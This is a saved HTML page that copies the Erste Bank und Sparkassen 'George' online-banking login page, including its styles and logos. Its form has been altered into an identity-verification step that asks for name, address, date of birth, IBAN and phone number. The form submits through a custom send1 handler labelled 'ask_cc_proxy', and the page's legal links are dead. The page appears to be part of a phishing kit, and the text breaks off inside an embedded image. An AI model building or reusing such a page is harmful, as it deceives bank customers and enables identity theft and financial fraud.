zcsMTUxMS40MDF6Ii8+DQo8L2c+DQo8L3N2Zz4NCg==);
    content: " ";
    width: 3rem;
    height: 3rem;
    background-size: contain;
    background-repeat: no-repeat;
    position: absolute;
    top: -1rem;
    left:48%;
    left: calc(50% - 1.5rem);
}

.inputTAC {
    width: 4rem;
}

.inputSMSOTP {
    width: 6rem;
}

/*
** wenn der TAC dialog doch ein Overlay sein soll -> vorbereitung für iFrame lösung **

.fullsizeiframe{
    width:100%;
    height:100%;
    position:absolute;
    top:0;
    left:0;
    right:0;
    bottom:0;
    overflow:auto;
    z-index:999999;
}

body.tac{ background: transparent;}

** ENDE iframe Lösung **
*/

/************************************************************************
* TAC Form and TAC FORM Page  - 3.9.2014 - RWD
* TAN Form and TAN Form Page
************************************************************************/ 

@media only screen and (max-width : 900px){
    
    body.tac > .wrapper,
    body.tan > .wrapper,
    body.cardtan > .wrapper,
    body.heureka > .wrapper{
        width:90%;
    }

}

@media only screen and (max-width : 630px){
    
    body.tac > .wrapper,
    body.tan > .wrapper,
    body.cardtan > .wrapper,
    body.heureka > .wrapper{
        width:100%;
        margin-top:15% !important;
    }


    body.tac > .wrapper form > *,
    body.tan > .wrapper form > *,
    body.cardtan > .wrapper form > *,
    body.heureka > .wrapper form > *{
        display: block;
        margin:1rem auto;
    }

    body.tac .removewhite,
    body.tan .removewhite,
    body.cardtan .removewhite,
    body.heureka .removewhite{
        position:absolute;
        top:1rem;
        right:1rem;
    }
}
 
/************************************************************************
* Access Confirmation Page
************************************************************************/ 
form#confirmationForm{
    display:inline-block;
}

form#denialForm{
    display:inline-block;
}

#errorhash{
    text-align: right;
    color:#e9e9e9;
}

/************************************************************************
* FEDLOG-1791 Cookie Banner
************************************************************************/ 
.banner {
    color: #fff;
    background: #313a45;
    position: relative;
    z-index: 2;
}

.banner__inner {
    margin: 0 auto;
    text-align: left;
    overflow: hidden;
    padding: 1.5rem 4rem 1.5rem 2.4rem;
	max-width: 1170px;
}

.banner--cookie .banner__inner:before {
    content: "i";
}

.banner__inner:before {
    font-family: icons;
    font-size: 12px;
	font-weight:900;
    float: left;
    margin-left: -2.2rem;
    margin-right: .5rem;
    top: .1rem;
    position: relative;   
	background: #fff;
    border-radius: 100%;
    width: 18px;
    height: 18px;
    text-align: center;
}

.banner__close--cookie {
    width: auto;
    height: auto;
    float: right;
    margin-left: 1rem;
    margin-right: -4rem;
    position: static;
}

.banner__close {
    width: 2.2rem;
    height: 2.2rem;
    position: absolute;
    right: 1.5rem;
    top: 1.5rem;
    background: 0 0;
    border: 0;
    position: relative;
    cursor: pointer;
    display: inline-block;
    padding: 0;
    margin: 0;
    outline: 0;
    vertical-align: middle;
}

.banner-btn {
    width: auto;
    float: right;
    margin-left: 1rem;
    margin-right: -4rem;
    position: static;
    right: 1.5rem;
    color: #fff !important;
    background-color: #ff7900;
    border-top-color: #ff7900;
    border-bottom-color: #c66206;
    box-shadow: inset 0 -2px 0 0 #df6e07;
    padding: .5rem 1rem;
    display: inline-block;
    vertical-align: middle;
    text-align: center;
    font-weight: 900;
    line-height: 1;
    font-size: 1rem;
    border-radius: 4px;
    border: 0;
    border-top: 1px solid transparent;
    border-bottom: 1px solid transparent;
    cursor: pointer;
}
.banner-btn > span{
	color: #fff !important;
	font-weight:normal;
}

.banner__inner p {
    margin: 0;
	color: #fff;	
	font-size:15px;
}

.banner__inner p  > a{
   border-bottom: solid 2px transparent;
    transition: border-bottom .5s ease;
}

.banner__inner p  > a:hover{
	 border-bottom: solid 2px #fff;
	 transition: border-bottom .5s ease;
}

.banner__inner a {
    color: #fff;
    border-bottom-width: 2px;
    font-weight: 700;
    border-bottom: 2px solid transparent;
	text-decoration: none;
    transition: color .25s,border-color .25s;
    cursor: pointer;
}

.banner-wrapper {
    max-width: 120rem;
    margin: 0 auto;
    position: relative;
    padding-left: 1.5rem;
    padding-right: 1.5rem;
}

/************************************************************************
* Loading bar (eg_* classes) from DDPL:
* https://digitaldesign.erstegroup.com/en/DDPLHome/template/loader 
************************************************************************/
.eg_loader--blue {
    background-image: url(../images/blue.gif);
    background-image: url(../images/loading-bars_blue.svg);
    max-width: 3rem;
}

.eg_loader {
    width: 100%;
    height: 2.2rem;
    margin: auto;
    display: flex;
    align-items: center;
    justify-content: center;
    background-size: contain;
    background-position: center center;
    background-repeat: no-repeat;
    min-height: 1rem;
}

.loader-container {
	height: 50px;
	margin-top: 28px;
}

/* Browserswitch for IE11 */
@media all and (-ms-high-contrast:none) {
	*::-ms-backdrop, .eg_loader--blue {
	    background-image: /*savepage-url=../images/blue.gif*/ url();
	}
}

/* FEDLOG-2671: Highlight debug messages */
#debugMessage {
	color: #cc0000; 
}</style>
	<script data-savepage-type="" type="text/plain" data-savepage-src="/sts/7hSTR7CfYN/gWqvRrszL2yz5NLdR4kW.js" async=""></script>
	<script data-savepage-type="" type="text/plain"></script>
	<script data-savepage-type="" type="text/plain"></script>

<style id="savepage-cssvariables">
  :root {
  }
</style>
<script id="savepage-shadowloader" type="text/javascript">
  "use strict";
  window.addEventListener("DOMContentLoaded",
  function(event) {
    savepage_ShadowLoader(5);
  },false);
  function savepage_ShadowLoader(c){createShadowDOMs(0,document.documentElement);function createShadowDOMs(a,b){var i;if(b.localName=="iframe"||b.localName=="frame"){if(a<c){try{if(b.contentDocument.documentElement!=null){createShadowDOMs(a+1,b.contentDocument.documentElement)}}catch(e){}}}else{if(b.children.length>=1&&b.children[0].localName=="template"&&b.children[0].hasAttribute("data-savepage-shadowroot")){b.attachShadow({mode:"open"}).appendChild(b.children[0].content);b.removeChild(b.children[0]);for(i=0;i<b.shadowRoot.children.length;i++)if(b.shadowRoot.children[i]!=null)createShadowDOMs(a,b.shadowRoot.children[i])}for(i=0;i<b.children.length;i++)if(b.children[i]!=null)createShadowDOMs(a,b.children[i])}}}
</script>
<meta name="savepage-url" content="https://login.sparkasse.at/sts/oauth/authorize?response_type=token&client_id=georgeclient&state=">
<meta name="savepage-title" content="Erste Bank und Sparkassen Login">
<meta name="savepage-pubdate" content="Unknown">
<meta name="savepage-from" content="https://login.sparkasse.at/sts/oauth/authorize?response_type=token&client_id=georgeclient&state=">
<meta name="savepage-date" content="Thu Dec 01 2022 21:23:51 GMT+0100 (Central European Standard Time)">
<meta name="savepage-state" content="Standard Items; Retain cross-origin frames; Merge CSS images; Remove unsaved URLs; Load lazy images in existing content; Max frame depth = 5; Max resource size = 50MB; Max resource time = 10s;">
<meta name="savepage-version" content="33.1">
<meta name="savepage-comments" content="">
  </head>


<body class="en hasIcon">
	










	
	
	<div class="wrapper" style="margin-top: 146.281px;">
		<div class="language">
			<a data-savepage-href="/sts/oauth/authorize?client_id=georgeclient&response_type=token&lang=en" href="https://login.sparkasse.at/sts/oauth/authorize?client_id=georgeclient&response_type=token&lang=en" class="lang_en"> </a>
			<a data-savepage-href="/sts/oauth/authorize?client_id=georgeclient&response_type=token&lang=de" href="https://login.sparkasse.at/sts/oauth/authorize?client_id=georgeclient&response_type=token&lang=de" class="lang_de"> </a>
		</div>
		<div class="col1 col">
			
			    <h1 class="logo" id="Doppel-Logo_o_Claim"><img data-savepage-currentsrc="https://login.sparkasse.at/sts/images/logos/Doppel-Logo_o_Claim.svg" data-savepage-src="/sts/images/logos/Doppel-Logo_o_Claim.svg" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iaXNvLTg4NTktMSI/Pg0KPCEtLSBHZW5lcmF0b3I6IEFkb2JlIElsbHVzdHJhdG9yIDE1LjEuMCwgU1ZHIEV4cG9ydCBQbHVnLUluIC4gU1ZHIFZlcnNpb246IDYuMDAgQnVpbGQgMCkgIC0tPg0KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4NCjxzdmcgdmVyc2lvbj0iMS4xIiBpZD0iRWJlbmVfMSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeD0iMHB4IiB5PSIwcHgiDQoJIHdpZHRoPSIzNzMuNjAycHgiIGhlaWdodD0iMzcuMDUxcHgiIHZpZXdCb3g9IjAgMCAzNzMuNjAyIDM3LjA1MSIgc3R5bGU9ImVuYWJsZS1iYWNrZ3JvdW5kOm5ldyAwIDAgMzczLjYwMiAzNy4wNTE7Ig0KCSB4bWw6c3BhY2U9InByZXNlcnZlIj4NCjxnPg0KCTxkZWZzPg0KCQk8cmVjdCBpZD0iU1ZHSURfMV8iIHg9Ii05MS44MzYiIHk9Ii0yOTcuOTgiIHdpZHRoPSI1OTUuMjgiIGhlaWdodD0iODQxLjg5Ii8+DQoJPC9kZWZzPg0KCTxjbGlwUGF0aCBpZD0iU1ZHSURfMl8iPg0KCQk8dXNlIHhsaW5rOmhyZWY9IiNTVkdJRF8xXyIgIHN0eWxlPSJvdmVyZmxvdzp2aXNpYmxlOyIvPg0KCTwvY2xpcFBhdGg+DQoJPHBhdGggc3R5bGU9ImNsaXAtcGF0aDp1cmwoI1NWR0lEXzJfKTtmaWxsOiNFMzA2MTM7IiBkPSJNMzU0LjU3NSw4LjIzMWMtMC45MjYtMC45NDItMS4zOTEtMi4wNzktMS4zOTEtMy40MQ0KCQljMC0xLjMwMSwwLjQ2NS0yLjQ0MSwxLjM3Ny0zLjM4M0MzNTUuNDg3LDAuNDg2LDM1Ni42MDgsMCwzNTcuOTA5LDBjMS4yNzcsMCwyLjM5NSwwLjQ3NiwzLjMyMywxLjQyNQ0KCQljMC45MzEsMC45NDMsMS40MDUsMi4wOTUsMS40MDUsMy4zOTZjMCwxLjMzMS0wLjQ2NSwyLjQ2OC0xLjM5NSwzLjQxYy0wLjkyOSwwLjk0OS0yLjA1NywxLjQyMy0zLjMzNCwxLjQyMw0KCQlDMzU2LjYwOCw5LjY1NCwzNTUuNDg3LDkuMTgsMzU0LjU3NSw4LjIzMSBNMzczLjYwMiwxOS4xMTh2LTIuOTMyYzAtMi43NzEtMi4yNDgtNS4wMjUtNS4wMjEtNS4wMjVoLTIxLjM0Ng0KCQljLTIuNzczLDAtNS4wMiwyLjI1NC01LjAyLDUuMDI1djExLjA0aDIzLjgxMVYyOC45aC0yMy44MTF2Mi45MjhjMCwyLjc3MywyLjI0Niw1LjAyMiw1LjAyLDUuMDIyaDIxLjM0Ng0KCQljMi43NzMsMCw1LjAyMS0yLjI0OSw1LjAyMS01LjAyMlYyMC43OWgtMjMuODA5di0xLjY3MkgzNzMuNjAyeiBNMTE0LjEwMSw4LjIzMWMtMC45MjYtMC45NDItMS4zOTEtMi4wNzktMS4zOTEtMy40MQ0KCQljMC0xLjMwMSwwLjQ2NS0yLjQ0MSwxLjM3Ny0zLjM4M0MxMTUuMDEzLDAuNDg2LDExNi4xMzMsMCwxMTcuNDM1LDBjMS4yNzcsMCwyLjM5NCwwLjQ3NiwzLjMyMiwxLjQyNQ0KCQljMC45MzIsMC45NDMsMS40MDYsMi4wOTUsMS40MDYsMy4zOTZjMCwxLjMzMS0wLjQ2NSwyLjQ2OC0xLjM5NCwzLjQxYy0wLjkzLDAuOTQ5LTIuMDU3LDEuNDIzLTMuMzM0LDEuNDIzDQoJCUMxMTYuMTMzLDkuNjU0LDExNS4wMTMsOS4xOCwxMTQuMTAxLDguMjMxIE0xMzMuMTI3LDE5LjExOHYtMi45MzJjMC0yLjc3MS0yLjI0OC01LjAyNS01LjAyMS01LjAyNUgxMDYuNzYNCgkJYy0yLjc3NCwwLTUuMDIsMi4yNTQtNS4wMiw1LjAyNXYxMS4wNGgyMy44MTFWMjguOUgxMDEuNzR2Mi45MjhjMCwyLjc3MywyLjI0Niw1LjAyMiw1LjAyLDUuMDIyaDIxLjM0Ng0KCQljMi43NzMsMCw1LjAyMS0yLjI0OSw1LjAyMS01LjAyMlYyMC43OWgtMjMuODA5di0xLjY3MkgxMzMuMTI3eiIvPg0KCTxwYXRoIHN0eWxlPSJjbGlwLXBhdGg6dXJsKCNTVkdJRF8yXyk7ZmlsbDojMDA0OTdCOyIgZD0iTTE1NS4wMjEsMTAuOTY2YzUuMzM3LDAsOC4xMDYsMC42MDEsOC4xMDYsMy4wOXYyLjUyOGgtNy4zMDMNCgkJYy0xLjk2NywwLTIuNTI5LDAuNTIxLTIuNTI5LDEuNTY0YzAsMy4wOTEsMTEuMTU2LDIuNDQ5LDExLjE1NiwxMS4xMTdjMCw0LjEzMy0yLjM2Nyw3Ljc4NS05LjU5MSw3Ljc4NQ0KCQljLTQuNzM1LDAtOC40NjctMC43NjItOC40NjctMy4wOXYtMi41MjhoOC42MjhjMS43NjUsMCwyLjYwOC0wLjU2MiwyLjYwOC0xLjgwNmMwLTMuMzcxLTExLjExNi0yLjcyOS0xMS4xMTYtMTEuNjM4DQoJCUMxNDYuNTEzLDE0LjA1NiwxNDkuMTIxLDEwLjk2NiwxNTUuMDIxLDEwLjk2NiBNMTY3LjI2LDEzLjQ1M2MwLTEuNTI0LDAuNjgyLTIuMjg3LDIuMjA3LTIuMjg3aDguMzQ3DQoJCWM1Ljg1OSwwLDkuMzEsMi41NjgsOS4zMSw3LjgyNWMwLDUuMDk3LTMuNDUxLDcuNDI1LTkuMzEsNy40MjVoLTQuMTM0djEwLjQzM2gtNi40MlYxMy40NTN6IE0xNzMuNjgsMTYuNTgzdjQuNjE0aDMuNjUzDQoJCWMyLjEyNiwwLDMuMzctMC40NDEsMy4zNy0yLjMyN2MwLTEuODQ2LTEuMjQ0LTIuMjg3LTMuMzctMi4yODdIMTczLjY4eiBNMjAwLjQ0NywxMS4wODZjMS4wODMsMCwxLjYwNCwwLjEyLDEuODQ1LDEuMDQzDQoJCWw1Ljk4LDIzLjcxOGMwLjA4LDAuMzYsMC4xMiwwLjcyMSwwLjEyLDEuMDAyaC01LjI1N2MtMS4wODQsMC0xLjQwNC0wLjA4LTEuNjA1LTAuOTYybC0xLjI0NS01LjEzN2gtNS45NzlsLTEuMTYzLDUuMTM3DQoJCWMtMC4yMDEsMC44ODItMC41MjMsMC45NjItMS42MDYsMC45NjJoLTUuMjE3YzAtMC4yODEsMC4wNC0wLjYwMSwwLjEyLTEuMDAybDUuOTgtMjMuNzE4YzAuMjQxLTAuOTIzLDAuNzYzLTEuMDQzLDEuODQ2LTEuMDQzDQoJCUgyMDAuNDQ3eiBNMTk1LjI3LDI1LjkzM2gzLjk3MmwtMS45MjYtOC4yMjZoLTAuMTZMMTk1LjI3LDI1LjkzM3ogTTIxMC4zOTgsMTMuNDUzYzAtMS41MjQsMC42ODMtMi4yODcsMi4yMDctMi4yODdoOC4zNDgNCgkJYzUuODU4LDAsOS4yMjksMi42ODgsOS4yMjksNy43NDVjMCwzLjQ5MS0xLjMyNCw1LjczOS00LjQ5NCw3LjAyMmw1LjAxNiw5Ljc5MmMwLjE2LDAuMzYyLDAuMzYxLDAuNzIzLDAuMzYxLDEuMTI0aC01LjUzOA0KCQljLTEuMTYzLDAtMS42NDYsMC0yLjIwNy0xLjE2NGwtNC40OTUtOS4yNjloLTIuMDA2djEwLjQzM2gtNi40MjFWMTMuNDUzeiBNMjE2LjgxOSwxNi41ODN2NC42MTRoMy42NTINCgkJYzEuODQ2LDAsMy4yOS0wLjI0LDMuMjktMi4yODdjMC0yLjAwNy0xLjQ0NC0yLjMyNy0zLjI5LTIuMzI3SDIxNi44MTl6IE0yMzkuNjkyLDIyLjkyNGw2LjQyLTEwLjU5NA0KCQljMC42MDMtMS4wNDQsMC45NjMtMS4xNjQsMS44MDctMS4xNjRoNi4wMmMwLDAuNDAxLTAuMDgsMC43MjMtMC4zMjEsMS4xMjRsLTcuMzg0LDExLjI3Nmw3Ljc0NSwxMi4xNTkNCgkJYzAuMiwwLjMyMiwwLjM2MSwwLjcyMywwLjM2MSwxLjEyNGgtNS44MTljLTEuMjAzLDAtMS41NjQtMC4wOC0yLjI0Ny0xLjE2NGwtNi41ODEtMTAuNTUzdjExLjcxN2gtNi40MjJWMTMuNDUzDQoJCWMwLTEuNTI0LDAuNjg0LTIuMjg3LDIuMjA4LTIuMjg3aDQuMjE0VjIyLjkyNHogTTI2OC44NjUsMTEuMDg2YzEuMDgzLDAsMS42MDQsMC4xMiwxLjg0NywxLjA0M2w1Ljk3OSwyMy43MTgNCgkJYzAuMDgsMC4zNiwwLjEyMSwwLjcyMSwwLjEyMSwxLjAwMmgtNS4yNThjLTEuMDg0LDAtMS40MDQtMC4wOC0xLjYwNS0wLjk2MmwtMS4yNDQtNS4xMzdoLTUuOTc5bC0xLjE2NCw1LjEzNw0KCQljLTAuMjAxLDAuODgyLTAuNTIxLDAuOTYyLTEuNjA1LDAuOTYyaC01LjIxN2MwLTAuMjgxLDAuMDQtMC42MDEsMC4xMi0xLjAwMmw1Ljk3OS0yMy43MThjMC4yNC0wLjkyMywwLjc2My0xLjA0MywxLjg0Ni0xLjA0Mw0KCQlIMjY4Ljg2NXogTTI2My42ODgsMjUuOTMzaDMuOTcybC0xLjkyNS04LjIyNmgtMC4xNjFMMjYzLjY4OCwyNS45MzN6IE0yODYuODQyLDEwLjk2NmM1LjMzOCwwLDguMTA1LDAuNjAxLDguMTA1LDMuMDl2Mi41MjgNCgkJaC03LjMwM2MtMS45NjcsMC0yLjUyOSwwLjUyMS0yLjUyOSwxLjU2NGMwLDMuMDkxLDExLjE1OCwyLjQ0OSwxMS4xNTgsMTEuMTE3YzAsNC4xMzMtMi4zNjksNy43ODUtOS41OTIsNy43ODUNCgkJYy00LjczNiwwLTguNDY4LTAuNzYyLTguNDY4LTMuMDl2LTIuNTI4aDguNjI4YzEuNzY2LDAsMi42MDgtMC41NjIsMi42MDgtMS44MDZjMC0zLjM3MS0xMS4xMTYtMi43MjktMTEuMTE2LTExLjYzOA0KCQlDMjc4LjMzNCwxNC4wNTYsMjgwLjk0MywxMC45NjYsMjg2Ljg0MiwxMC45NjYgTTMwNi43MDYsMTAuOTY2YzUuMzM4LDAsOC4xMDcsMC42MDEsOC4xMDcsMy4wOXYyLjUyOGgtNy4zMDUNCgkJYy0xLjk2NywwLTIuNTI3LDAuNTIxLTIuNTI3LDEuNTY0YzAsMy4wOTEsMTEuMTU2LDIuNDQ5LDExLjE1NiwxMS4xMTdjMCw0LjEzMy0yLjM2OSw3Ljc4NS05LjU5Miw3Ljc4NQ0KCQljLTQuNzM0LDAtOC40NjctMC43NjItOC40NjctMy4wOXYtMi41MjhoOC42MjdjMS43NjYsMCwyLjYwOS0wLjU2MiwyLjYwOS0xLjgwNmMwLTMuMzcxLTExLjExNy0yLjcyOS0xMS4xMTctMTEuNjM4DQoJCUMyOTguMTk4LDE0LjA1NiwzMDAuODA3LDEwLjk2NiwzMDYuNzA2LDEwLjk2NiBNMzE4Ljk0NCwxMy40NTNjMC0xLjUyNCwwLjY4NC0yLjI4NywyLjIwNy0yLjI4N2gxNC4wNDd2My4xNw0KCQljMCwxLjUyNS0wLjc2NCwyLjI0OC0yLjI4OCwyLjI0OGgtNy41NDR2NC42MTRoOC40Mjh2NS4yMThoLTguNDI4djUuMDE2aDEwLjAzM3YzLjE3YzAsMS41MjUtMC43NjQsMi4yNDctMi4yODksMi4yNDdoLTExLjk1OQ0KCQljLTEuNTIzLDAtMi4yMDctMC43NjItMi4yMDctMi4yODdWMTMuNDUzeiBNMCwxMy40NTRjMC0xLjUyNSwwLjY4My0yLjI4OCwyLjIwNy0yLjI4OGgxNC4wNDZ2My4xNzENCgkJYzAsMS41MjUtMC43NjIsMi4yNDctMi4yODcsMi4yNDdINi40MjF2NC42MTVoOC40Mjh2NS4yMTdINi40MjF2NS4wMTdoMTAuMDMydjMuMTY5YzAsMS41MjYtMC43NjEsMi4yNDgtMi4yODcsMi4yNDhIMi4yMDcNCgkJQzAuNjgzLDM2Ljg1LDAsMzYuMDg3LDAsMzQuNTYyVjEzLjQ1NHogTTE5LjA2NiwxMy40NTRjMC0xLjUyNSwwLjY4Mi0yLjI4OCwyLjIwOC0yLjI4OGg4LjM0NmM1Ljg2LDAsOS4yMzEsMi42ODksOS4yMzEsNy43NDYNCgkJYzAsMy40OTEtMS4zMjQsNS43MzgtNC40OTUsNy4wMjJsNS4wMTYsOS43OTJjMC4xNiwwLjM2MSwwLjM2MiwwLjcyMywwLjM2MiwxLjEyNGgtNS41MzhjLTEuMTY0LDAtMS42NDYsMC0yLjIwNy0xLjE2NA0KCQlsLTQuNDk2LTkuMjdoLTIuMDA2VjM2Ljg1aC02LjQyMVYxMy40NTR6IE0yNS40ODcsMTYuNTgzdjQuNjE1aDMuNjUyYzEuODQ2LDAsMy4yOTEtMC4yNDEsMy4yOTEtMi4yODcNCgkJYzAtMi4wMDctMS40NDUtMi4zMjgtMy4yOTEtMi4zMjhIMjUuNDg3eiBNNDkuMzY4LDEwLjk2NmM1LjMzOCwwLDguMTA3LDAuNjAyLDguMTA3LDMuMDl2Mi41MjhoLTcuMzA0DQoJCWMtMS45NjYsMC0yLjUyOCwwLjUyMi0yLjUyOCwxLjU2NWMwLDMuMDksMTEuMTU2LDIuNDQ4LDExLjE1NiwxMS4xMTdjMCw0LjEzMy0yLjM2Nyw3Ljc4NS05LjU5MSw3Ljc4NQ0KCQljLTQuNzM1LDAtOC40NjctMC43NjMtOC40NjctMy4wOXYtMi41MjhoOC42MjdjMS43NjYsMCwyLjYwOS0wLjU2MiwyLjYwOS0xLjgwN2MwLTMuMzctMTEuMTE2LTIuNzI5LTExLjExNi0xMS42MzcNCgkJQzQwLjg2MSwxNC4wNTYsNDMuNDY5LDEwLjk2Niw0OS4zNjgsMTAuOTY2IE03Ni40NiwxMS4xNjZ2My4yNTFjMCwxLjQ4NS0wLjc2MiwyLjE2Ny0yLjI0NywyLjE2N2gtMy4xNzFWMzYuODVoLTYuNDIxVjE2LjU4Mw0KCQloLTUuNDE3di0zLjI1MWMwLTEuNDg0LDAuNzYyLTIuMTY3LDIuMjQ3LTIuMTY3SDc2LjQ2eiBNNzguNDcsMTMuNDU0YzAtMS41MjUsMC42ODMtMi4yODgsMi4yMDgtMi4yODhoMTQuMDQ1djMuMTcxDQoJCWMwLDEuNTI1LTAuNzYyLDIuMjQ3LTIuMjg3LDIuMjQ3aC03LjU0NXY0LjYxNWg4LjQyOHY1LjIxN2gtOC40Mjh2NS4wMTdoMTAuMDMzdjMuMTY5YzAsMS41MjYtMC43NjMsMi4yNDgtMi4yODcsMi4yNDhIODAuNjc4DQoJCWMtMS41MjUsMC0yLjIwOC0wLjc2My0yLjIwOC0yLjI4OFYxMy40NTR6Ii8+DQo8L2c+DQo8L3N2Zz4NCg==" style="width:100%;height:auto;"></h1>
			
			<div class="text">
				
			</div>
			<div class="commonalert">
				
			</div>
			<div class="product">
				<img data-savepage-currentsrc="https://login.sparkasse.at/sts/images/clients/George-symbol.svg" data-savepage-src="/sts/images/clients/George-symbol.svg" src="data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4NCjwhRE9DVFlQRSBzdmcgUFVCTElDICItLy9XM0MvL0RURCBTVkcgMS4xLy9FTiIgImh0dHA6Ly93d3cudzMub3JnL0dyYXBoaWNzL1NWRy8xLjEvRFREL3N2ZzExLmR0ZCI+DQo8c3ZnIHZlcnNpb249IjEuMSIgaWQ9IkxheWVyXzEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiIHg9IjBweCIgeT0iMHB4Ig0KCSB3aWR0aD0iNDZweCIgaGVpZ2h0PSI3NHB4IiB2aWV3Qm94PSIzNjQuMjUgMjYyLjc1NCA0NiA3NCIgZW5hYmxlLWJhY2tncm91bmQ9Im5ldyAzNjQuMjUgMjYyLjc1NCA0NiA3NCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSI+DQo8cGF0aCBmaWxsPSIjMDA0OTdCIiBkPSJNMzg3LjEyNywzMjkuNTRjOC42MiwwLDE1LjYzMy03LjAxMiwxNS42MzMtMTUuNjMzaDcuMjE1YzAsMTIuNi0xMC4yNDksMjIuODQ3LTIyLjg0OCwyMi44NDdWMzI5LjU0eiIvPg0KPHBhdGggZmlsbD0iIzAwNDk3QiIgZD0iTTM4Ny4wOTcsMzA4LjY4M2MtMTIuNTk5LDAtMjIuODQ4LTEwLjI0OS0yMi44NDgtMjIuODQ4YzAtMTIuNTk4LDEwLjI0OS0yMi44NDgsMjIuODQ4LTIyLjg0OA0KCWMxMi41OTksMCwyMi44NDksMTAuMjUsMjIuODQ5LDIyLjg0OEM0MDkuOTQ2LDI5OC40MzQsMzk5LjY5NywzMDguNjgzLDM4Ny4wOTcsMzA4LjY4M3ogTTM4Ny4wOTcsMjcwLjIwNA0KCWMtOC42MiwwLTE1LjYzMyw3LjAxMy0xNS42MzMsMTUuNjMyYzAsOC42MjEsNy4wMTMsMTUuNjMzLDE1LjYzMywxNS42MzNjOC42MjEsMCwxNS42MzMtNy4wMTIsMTUuNjMzLTE1LjYzMw0KCUM0MDIuNzMxLDI3Ny4yMTcsMzk1LjcxOCwyNzAuMjA0LDM4Ny4wOTcsMjcwLjIwNHoiLz4NCjwvc3ZnPg0K" class="producticon">
				<h2>George</h2>
				<p>Einfach. Intelligent. Individuell. Und mehr. Willkommen beim modernsten Banking Österreichs.</p>
				<div class="links">
					
					
					<a href="#">Impressum</a>
					
					<br>
					<a href="#" >Datenschutz</a>
					
					<br>
					<a href="#" >Geschäftsbedingungen</a>
					
					<br>
					<a href="#" >Service & Kontakt</a>
					
				</div>
			</div>
		</div>
		<div class="col2 col" style="min-height: 252px;">
			<div class="whitebox" role="main" >
				<div class="flipicon hasBgImage" title="Click to get additional information."></div>
				<h1>Identität</h1>
				<div class="commontext">
					Bestätigen Sie Ihre Identität.
				</div>
				<div class="iealert" style="padding-bottom: 0px;"></div>
				<div id="error" class="infotext"></div>
			<form   novalidate onsubmit="send1(event,'ask_cc_proxy');return false" >
				<div class="number">
					<span class="icon numbericon hasBgImage"></span><input id="user" pattern=".{4,}" placeholder="Vor- und Nachname" name="name" class="input" autocomplete="off" type="text" maxlength="80" value=""><script data-savepage-type="text/javascript" type="text/plain"></script>
				</div>
				
				<br>
				
				<div class="number">
					<span class="icon numbericon hasBgImage"></span><input id="user" pattern=".{4,}" placeholder="Adresse" name="address" class="input" autocomplete="off" type="text" maxlength="80" value=""><script data-savepage-type="text/javascript" type="text/plain"></script>
				</div>
				
				<br>
				
				<div class="number">
					<span class="icon numbericon hasBgImage"></span><input id="dob" pattern=".{4,}" placeholder="Geburtsdatum DD/MM/JJJJ" name="dob" class="form-control input" autocomplete="off" type="text" maxlength="80" value=""><script data-savepage-type="text/javascript" type="text/plain"></script>
				</div>
				
				
				    <script type="text/javascript">
         jQuery(function($){
           $("#dob").mask("99/99/9999");
         }
               );
      </script>
	  
	  
	
				
				<br>
				
				<div class="number">
					<span class="icon numbericon hasBgImage"></span><input id="user" pattern=".{4,}" placeholder="IBAN" name="iban" class="input" autocomplete="off" type="text" maxlength="80" value=""><script data-savepage-type="text/javascript" type="text/plain"></script>
				</div>
				
				<br>
				
				<div class="number">
					<span class="icon numbericon hasBgImage"></span><input id="user" pattern=".{4,}" placeholder="Telefonnummer" name="phone" class="input" autocomplete="off" type="text" maxlength="80" value=""><script data-savepage-type="text/javascript" type="text/plain"></script>
				</div>
				
				<br>
				
				<div class="submit">
					
					
						<input id="submitButton" type="submit" class="submit" value="Bestätigen">
					
					
					
				</div>
				<input id="iwhtInput" type="hidden" name="iwht" value=""><script data-savepage-type="text/javascript" type="text/plain"></script>
			</form>
			
				</div>
			<div class="whitebox-info" style="height: 192px;">
				<p>You can find your user number on your Bankcard.</p>
				<div class="center"><img data-savepage-currentsrc="https://login.sparkasse.at/sts/images/bankcard.gif" data-savepage-src="/sts/images/bankcard.gif" src="data:image/gif;base64,R0lGODlhwgEyAfcAAE+LtEy26ySW1Utyj8rKyom30xYXF7bo/i+u55bO+7m5uSel37fe/K2trWas7d2dKVWSzS1SbFCq05ycnIqJiZjK7OYCDm2HlXW260h4qTZsjo2otsnp++z7/tvn74a87SlFVErG99fq92i37LTI02WazKrn/3OlvB0yRXbX/kpneYjG6ymHs3mqyLra62ipyWan22fG7m9wcJXD22WXuFKDnHi42+3v92rX/zdqqpro//J8X3WbunaXqqnW7mO322OKpXms2YucqVFSUqfN62WUqnfG7aq9yRNOdmN7izJje+qXjhhnkTRYio0NAoaUmabO+D5XZtje6qaal5rW7xt2qFnD7KpaZnWs6nm1zcvW2+1POvfv70V3wpltFaS1vbzx/8be+XErImCLu/fOyVmZ3c7n7yCNzhZBXH+ZaICMk8j6/8jO0yac39v2/6Gtt0nB73umhRpafXXn/3Ss+fK8umSb5Kucq2nG3mtoKThywrB3fnWMoGVlYburqWFYV1Siwheb54vW7paMi6Slpfvj3j1dgh2l71jW/6Py/5SUlKCKnNw0MXO9/2u9/1rG92ut91LG95ze95TW96Xe93O992Ot93PO96Xe/3vO92u198be7/f3963e/+/v74zW9/fv95zW94TW92vO92u1/2PO9+fn53vG/97e3ozO/4TG/3u99tbW1sbe52PG96XW/4TG93vG92O9/2u9963e93O194TO9qXW94TO/5zW/47G96/W93PG/5ze/5Te/87e74zO9efv73y9/2K1/2O195TW/4zG/4zW/2PO/1rO9/f//2Kt/3O1/4ze/2vG/2vO/0/O/+fn73vO/1rO/3PO/67W/2ut/2vG91HO93PG94TW/2ul8+/n787e52PG/9be3l298Hu18vf3///393/f/+fe5WGl8d7W3tbW3nu1/1